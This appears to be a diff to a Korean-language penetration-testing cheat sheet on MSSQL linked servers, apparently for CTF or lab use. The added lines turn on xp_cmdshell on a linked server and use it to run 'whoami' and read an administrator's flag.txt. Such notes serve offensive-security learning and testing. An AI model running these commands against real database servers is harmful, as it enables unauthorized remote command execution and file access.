@@ -161,6 +161,7 @@ SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_princ
 Linked Server를 통해 다른 데이터베이스 서버와 통신할 수 있습니다.
 
 ```mssql
+# isremote = 0 : linked server
 -- 연결된 서버 목록 조회
 1> SELECT srvname, isremote FROM sysservers
 2> GO
@@ -168,6 +169,15 @@ Linked Server를 통해 다른 데이터베이스 서버와 통신할 수 있습
 -- 원격 서버에서 명령 실행
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
+
+EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
+EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+
+EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+
+EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
 ```
 
 ---
